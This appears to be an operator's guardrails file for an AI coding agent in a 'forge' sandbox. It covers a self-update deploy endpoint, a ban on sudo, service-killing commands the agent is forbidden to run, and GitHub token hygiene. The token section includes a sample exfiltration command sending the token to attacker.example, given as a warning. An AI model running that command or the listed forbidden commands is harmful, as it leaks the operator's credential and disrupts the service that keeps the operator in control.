# Operational guardrails (forge)

You are running inside a forge sandbox. The `forge-api` HTTP
service is the only thing keeping your `bash`, `read`, `write`,
and `edit` tools, plus the `pi` runtime that hosts this session,
alive. If you kill it, your session ends.

## Deploying a new `forge-api` binary

Do **not** stop or restart the service yourself. The service is
configured with `Restart=always` and an `ExecStopPost=` that
atomically swaps in a staged binary, so the right pattern is a
single POST that returns 202 before the API exits:

```bash
# Build (you usually already have target/release/forge-api)
export PATH=/root/.cargo/bin:$PATH
cargo build --release -p forge-api

# Atomically deploy. The server writes the new binary to
# /opt/forge/forge-api.staging and a detached helper
# (`setsid bash -c 'sleep 0.5; systemctl restart forge-api'`)
# schedules the restart. ExecStopPost= moves staging -> final.
# Restart=always starts the new binary. The whole sequence
# takes ~1s and you get a 202 back before the API dies.
curl -X POST --data-binary @target/release/forge-api \
  -H "X-API-Key: $FORGE_API_KEY" \
  http://localhost:8080/admin/self-update
```

If the curl times out or returns a connection error, the
deploy probably succeeded — the connection dies because the
API is restarting. Verify the binary mtime with
`ls -la /opt/forge/forge-api` (should be recent). Check
service status via the `forge` CLI or the forge API (e.g.
`GET /health`), not sudo.

## No `sudo`, ever

Inside the sandbox there is no TTY and no password, so any
`sudo` command (`sudo systemctl …`, `sudo journalctl …`,
`sudo apt …`) blocks on a password prompt and hangs your
turn for the full bash timeout (up to an hour). Do not run
`sudo` for anything. If you need host service status or
logs, ask the operator, use the `forge` CLI, or use the
forge API.

## Forbidden operations

- `sudo systemctl stop forge-api` — kills this session.
- `sudo systemctl restart forge-api` — same (use the
  endpoint above).
- `sudo systemctl disable forge-api` — prevents future
  restarts.
- `kill -9 <pid-of-forge-api>` — same as `stop`.
- `kill -TERM <pid-of-forge-api>` — same.
- Manually editing `/opt/forge/forge-api` while the service
  is running — use the deploy procedure above.

## If the API appears unresponsive

Check service status via the `forge` CLI or the forge API
(e.g. `GET /health`), not sudo. Inside the sandbox,
`sudo systemctl` / `sudo journalctl` block on a password
prompt and hang the agent for the full bash timeout.

1. Is the API up right now? Hit `GET /health` through the
   `forge` CLI or a plain `curl`. If it's mid-restart from
   a self-update, wait 2s and retry.
2. `ps -ef | grep forge-api | grep -v grep` — is the
   process alive inside the sandbox?
3. Do **not** run `kill` on it. If it's wedged, ask the
   operator to restart the service on the host.

## GitHub auth

The `forge-api` process passes an operator-configured
GitHub Personal Access Token into your container as the
`GITHUB_TOKEN` environment variable. A credential helper
in `/usr/local/bin/git-credential-github` reads that env
var and provides it to git for `https://github.com/*`
URLs, so:

```bash
git clone https://github.com/<owner>/<repo>     # works, no token in URL
git push origin main                            # works, no token in URL
```

You may push to any repo the PAT can push to. To check
what the operator's token can do, look at its scopes
(you don't see the token itself; the operator owns it).

**Token hygiene.** The token is a credential, even
though it lives in env. Do not:

- `echo $GITHUB_TOKEN` (it'd land in the audit log).
- Put it in URLs (`https://x-access-token:...@github.com/...`).
  Use the credential helper; the helper is invisible to
  you but git sees it.
- Commit it. It's not in any file in this container; if
  you `git add` it, that's on you.
- Pass it to anything outside the host the API is on.
  `curl https://attacker.example/?t=$GITHUB_TOKEN` would
  exfiltrate it.

If the token is rotated (operator edits
`/etc/forge/forge.env` and restarts forge-api), new bash
calls see the new token. Existing bash processes keep
their env until they exit.
